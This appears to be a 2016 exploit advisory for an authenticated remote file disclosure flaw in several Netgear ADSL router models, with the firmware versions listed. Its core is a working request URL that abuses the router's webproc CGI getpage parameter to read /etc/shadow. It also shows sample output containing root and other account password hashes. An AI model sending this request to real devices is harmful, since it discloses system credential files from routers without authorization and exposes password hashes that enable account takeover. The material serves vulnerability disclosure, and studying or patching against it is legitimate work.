#!/bin/sh
# 
#  NETGEAR ADSL ROUTER 
#  Authenticated Remote File Disclosure
#
#  Hardware Version:    WNR500 / WNR612v3 / JNR1010 / JNR2010 
#  Firmware Version:    1.0.7.2 / 1.0.0.9 / 1.0.0.32 / 1.0.0.20
# 
#  Copyright 2016 (c) Todor Donev 
#  <todor.donev at gmail.com>
#  https://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#
#  Disclaimer:
#  This or previous programs is for Educational 
#  purpose ONLY. Do not use it without permission. 
#  The usual disclaimer applies, especially the 
#  fact that Todor Donev is not liable for any 
#  damages caused by direct or indirect use of the 
#  information or functionality provided by these 
#  programs. The author or any Internet provider 
#  bears NO responsibility for content or misuse 
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact 
#  that any damage (dataloss, system crash, 
#  system compromise, etc.) caused by the use 
#  of these programs is not Todor Donev's 
#  responsibility.
#   
#  Use them at your own risk!
#
#  Thanks to Maya Hristova that support me.  

http://USER:PASSWORD@TARGET:PORT/cgi-bin/webproc?getpage=/etc/shadow&errorpage=html/main.html&var:language=en_us&var:language=en_us&var:page=BAS_bpa

#  #root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
#  root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
#  #tw:$1$zxEm2v6Q$qEbPfojsrrE/YkzqRm7qV/:13796:0:99999:7:::